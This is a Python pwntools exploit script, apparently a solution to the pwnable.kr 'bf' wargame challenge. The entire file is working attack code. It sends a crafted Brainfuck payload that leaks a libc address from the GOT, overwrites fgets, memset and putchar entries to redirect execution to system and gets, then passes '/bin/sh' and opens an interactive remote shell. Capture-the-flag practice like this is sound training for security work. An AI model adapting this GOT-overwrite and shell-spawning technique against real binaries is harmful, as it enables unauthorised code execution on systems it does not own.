from pwn import *

DEBUG=False

context(arch="i386", os="linux", bits=32, log_level="INFO")

libc=ELF("/tmp/BF/bf_libc.so")
fgets=libc.symbols['fgets']
gets=libc.symbols['gets']
system=libc.symbols['system']
log.info("fgets @ libc: {}".format(hex(fgets)))
def connect():
    if DEBUG==True:
        r=process("/tmp/BF/bf", env={'LD_PRELOAD':'/tmp/BF/bf_libc.so'})
    else:
        r=remote("pwnable.kr",9001)
    r.recvline_startswith("type")
    return r

def main():
    c=connect()
    '''
    pid=util.proc.pidof(c)[0]
    log.info("[DEBUG]: {}".format(pid))
    util.proc.wait_for_debugger(pid)
    '''
    payload     =   ""
    payload     +=  "<"*(0x804a0a0-0x0804a010)  # leak libc addy
    payload     +=  ".>"*4
    payload     +=  "<"*4
    payload     +=  ",>"*4                      # move fgets to system
    payload     +=  ">"*(0x804a02c - 0x804a014) # mov ptr to memset
    payload     +=  ",>"*4                        # write gets to memset
    payload     +=  ",>"*4                        # write main addy to putchar
    payload     +=  "."                         # trigger putchar -> main()
    c.sendline(payload)

    fgets_l=u32(c.recvn(4))
    libc_base=fgets_l-fgets
    log.info("Leaked fgets: 0x{:08X}".format(fgets_l))
    log.info("Leaked libc: 0x{:08X}".format(libc_base))
    c.send(p32(libc_base+system))
    c.send(p32(libc_base+gets))
    c.send(p32(0x08048671))
    c.sendline("/bin/sh")
    c.interactive()
if __name__=="__main__":
    main()
